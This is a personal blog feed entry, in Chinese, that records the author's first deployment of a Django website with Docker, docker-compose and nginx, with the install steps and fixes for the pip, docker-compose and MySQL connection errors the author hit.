    <id>https://starrysky1004.github.io/2024/01/29/ji-yu-yi-you-xiang-mu-bu-shu-wang-zhan/ji-yu-yi-you-xiang-mu-bu-shu-wang-zhan/</id>
    <published>2024-01-29T06:37:50.000Z</published>
    <updated>2024-01-29T08:50:30.606Z</updated>
    
    <content type="html"><![CDATA[<p>被拉过去帮忙给项目部署网站，之前从来没有接触过这些，现学了一些知识，记录一下过程和过程中遇到的一些问题</p><h2 id="前置环境要求"><a href="#前置环境要求" class="headerlink" title="前置环境要求"></a>前置环境要求</h2><ul><li>安装<code>vim</code>、<code>curl</code>、<code>git</code>、<code>pip</code>、<code>nginx</code>、<code>net-tools</code></li></ul><p><code>curl</code>是为了安装<code>docker</code>，但也可以通过<code>pip</code>安装，就不需要安装<code>curl</code>了</p><p><code>net-tools</code>用来使用<code>ifconfig</code>查<code>ip</code>地址</p><p>安装指令也很简单，就是<code>sudo apt install xxx</code>，安装之前可以先更新一下<code>sudo apt update</code></p><p>个人不习惯进<code>su</code>（因为我的<code>zsh</code>主题好看！），但是经常需要输入密码，嫌麻烦可以<code>sudo su</code></p><ul><li><p>安装<code>docker</code>和<code>docker-compose</code></p><ul><li><p><code>docker</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> get.docker.com <span class="token parameter variable">-o</span> get-docker.sh<span class="token function">sudo</span> <span class="token function">sh</span> get-docker.sh<span class="token function">rm</span> get-docker.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>docker</code>安装方法网上还有很多，比如<code>sudo pip install docker</code>，但我看这个顺眼（</p></li><li><p><code>docker-compose</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pip <span class="token function">install</span> <span class="token function">docker-compose</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接安装会遇到报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ERROR: <span class="token function">docker</span> <span class="token number">7.0</span>.0 has requirement requests<span class="token operator">>=</span><span class="token number">2.26</span>.0, but you<span class="token string">'ll have requests 2.22.0 which is incompatible.Installing collected packages: docopt, dockerpty, distro, attrs, pyrsistent, jsonschema, python-dotenv, websocket-client, urllib3, packaging, bcrypt, pycparser, cffi, pynacl, cryptography, paramiko, docker, texttable, docker-composeAttempting uninstall: distroFound existing installation: distro 1.4.0Not uninstalling distro at /usr/lib/python3/dist-packages, outside environment /usrCan'</span>t uninstall <span class="token string">'distro'</span><span class="token builtin class-name">.</span> No files were found to uninstall.Attempting uninstall: urllib3Found existing installation: urllib3 <span class="token number">1.25</span>.8Not uninstalling urllib3 at /usr/lib/python3/dist-packages, outside environment /usrCan<span class="token string">'t uninstall '</span>urllib3<span class="token string">'. No files were found to uninstall.Attempting uninstall: pynaclFound existing installation: PyNaCl 1.3.0Not uninstalling pynacl at /usr/lib/python3/dist-packages, outside environment /usrCan'</span>t uninstall <span class="token string">'PyNaCl'</span><span class="token builtin class-name">.</span> No files were found to uninstall.Attempting uninstall: cryptographyFound existing installation: cryptography <span class="token number">2.8</span>Not uninstalling cryptography at /usr/lib/python3/dist-packages, outside environment /usrCan<span class="token string">'t uninstall '</span>cryptography'. No files were found to uninstall.Successfully installed attrs-23.2.0 bcrypt-4.1.2 cffi-1.16.0 cryptography-42.0.1 distro-1.9.0 docker-7.0.0 docker-compose-1.29.2 dockerpty-0.4.1 docopt-0.6.2 jsons<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>嗯其实看第一句就好了：<code>has requirement requests&gt;=2.26.0</code>所以要先升级<code>requests</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> requests<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ul><h2 id="部署网站"><a href="#部署网站" class="headerlink" title="部署网站"></a>部署网站</h2><ul><li><p>先把项目<code>git clone</code>到本地，根据<code>dockerfile</code>中的内容在根目录指定路径创建数据库文件夹</p></li><li><p><code>ifconfig</code>查本地<code>ip</code>之后把项目文件中<code>settings</code>和<code>nginx.conf</code>中用到<code>ip</code>的地方改成本地<code>ip</code></p></li><li><p>接下来在有<code>dockerfile</code>的文件夹下生成容器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有可能遇到报错</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:File <span class="token string">"/usr/local/bin/docker-compose"</span>, line <span class="token number">8</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>sys.exit<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">))</span>File <span class="token string">"/usr/local/lib/python3.8/dist-packages/compose/cli/main.py"</span>, line <span class="token number">81</span>, <span class="token keyword">in</span> maincommand_func<span class="token punctuation">(</span><span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.8/dist-packages/compose/cli/main.py"</span>, line <span class="token number">200</span>, <span class="token keyword">in</span> perform_commandproject <span class="token operator">=</span> project_from_options<span class="token punctuation">(</span><span class="token string">'.'</span>, options<span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.8/dist-packages/compose/cli/command.py"</span>, line <span class="token number">60</span>, <span class="token keyword">in</span> project_from_options<span class="token builtin class-name">return</span> get_project<span class="token punctuation">(</span>File <span class="token string">"/usr/local/lib/python3.8/dist-packages/compose/cli/command.py"</span>, line <span class="token number">152</span>, <span class="token keyword">in</span> get_projectclient <span class="token operator">=</span> get_client<span class="token punctuation">(</span>File <span class="token string">"/usr/local/lib/python3.8/dist-packages/compose/cli/docker_client.py"</span>, line <span class="token number">41</span>, <span class="token keyword">in</span> get_clientclient <span class="token operator">=</span> docker_client<span class="token punctuation">(</span>File <span class="token string">"/usr/local/lib/python3.8/dist-packages/compose/cli/docker_client.py"</span>, line <span class="token number">124</span>, <span class="token keyword">in</span> docker_clientkwargs <span class="token operator">=</span> kwargs_from_env<span class="token punctuation">(</span>environment<span class="token operator">=</span>environment, <span class="token assign-left variable">ssl_version</span><span class="token operator">=</span>tls_version<span class="token punctuation">)</span>TypeError: kwargs_from_env<span class="token punctuation">(</span><span class="token punctuation">)</span> got an unexpected keyword argument <span class="token string">'ssl_version'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把<code>-</code>去掉就好了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> compose up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>容器里运行<code>makemigrations</code>和<code>migrate</code>来生成相应文件夹</p><ul><li><p><code>docker ps</code>查容器名，然后执行指令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token builtin class-name">exec</span> name python manage.py makemigrations<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token builtin class-name">exec</span> name python manage.py migrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果<code>settings</code>里的<code>ip</code>改错了就可能遇到报错</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:File <span class="token string">"/usr/local/lib/python3.9/site-packages/django/db/backends/base/base.py"</span>, line <span class="token number">289</span>, <span class="token keyword">in</span> ensure_connectionself.connect<span class="token punctuation">(</span><span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.9/site-packages/django/utils/asyncio.py"</span>, line <span class="token number">26</span>, <span class="token keyword">in</span> inner<span class="token builtin class-name">return</span> func<span class="token punctuation">(</span>*args, **kwargs<span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.9/site-packages/django/db/backends/base/base.py"</span>, line <span class="token number">270</span>, <span class="token keyword">in</span> connectself.connection <span class="token operator">=</span> self.get_new_connection<span class="token punctuation">(</span>conn_params<span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.9/site-packages/django/utils/asyncio.py"</span>, line <span class="token number">26</span>, <span class="token keyword">in</span> inner<span class="token builtin class-name">return</span> func<span class="token punctuation">(</span>*args, **kwargs<span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.9/site-packages/django/db/backends/mysql/base.py"</span>, line <span class="token number">247</span>, <span class="token keyword">in</span> get_new_connectionconnection <span class="token operator">=</span> Database.connect<span class="token punctuation">(</span>**conn_params<span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.9/site-packages/MySQLdb/init.py"</span>, line <span class="token number">121</span>, <span class="token keyword">in</span> Connect<span class="token builtin class-name">return</span> Connection<span class="token punctuation">(</span>*args, **kwargs<span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.9/site-packages/MySQLdb/connections.py"</span>, line <span class="token number">193</span>, <span class="token keyword">in</span> initsuper<span class="token punctuation">(</span><span class="token punctuation">)</span>.init<span class="token punctuation">(</span>*args, **kwargs2<span class="token punctuation">)</span>MySQLdb.OperationalError: <span class="token punctuation">(</span><span class="token number">2002</span>, <span class="token string">"Can't connect to server on 'wrong ip' (115)"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时需要删除容器和镜像，将<code>ip</code>修改正确之后再次运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> rmi <span class="token operator">&lt;</span>your-image-id<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">rm</span> <span class="token operator">&lt;</span>your-docker-id<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中<code>id</code>可以通过<code>docker ps</code>查看</p></li></ul></li><li><p>将项目中的<code>nginx.conf</code>替换<code>/etc/nginx/sites-available</code>中的<code>default</code>(要把名字也改成<code>default</code>)，再加载<code>nginx</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nginx <span class="token parameter variable">-s</span> reload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nginx <span class="token parameter variable">-t</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>最后将项目文件中的<code>dist</code>文件复制到根目录创建的文件夹下</p></li></ul><hr><p>以上只针对这次项目的部署，很多环境在给的<code>dockerfile</code>中配好了，我也没怎么去研究，仅记录一下中间遇到的一些问题，虽然是一些小问题但是耗了我两三个小时…嗯仅供参考吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;被拉过去帮忙给项目部署网站，之前从来没有接触过这些，现学了一些知识，记录一下过程和过程中遇到的一些问题&lt;/p&gt;
&lt;h2 id=&quot;前置环境要求&quot;&gt;&lt;a href=&quot;#前置环境要求&quot; class=&quot;headerlink&quot; title=&quot;前置环境要求&quot;&gt;&lt;/a&gt;前置环境要求&lt;/h</summary>
      
    
    
    
    <category term="web前端" scheme="https://starrysky1004.github.io/categories/web%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="web前端" scheme="https://starrysky1004.github.io/tags/web%E5%89%8D%E7%AB%AF/"/>
    
    <category term="docker" scheme="https://starrysky1004.github.io/tags/docker/"/>
    
  </entry>
  
</feed>
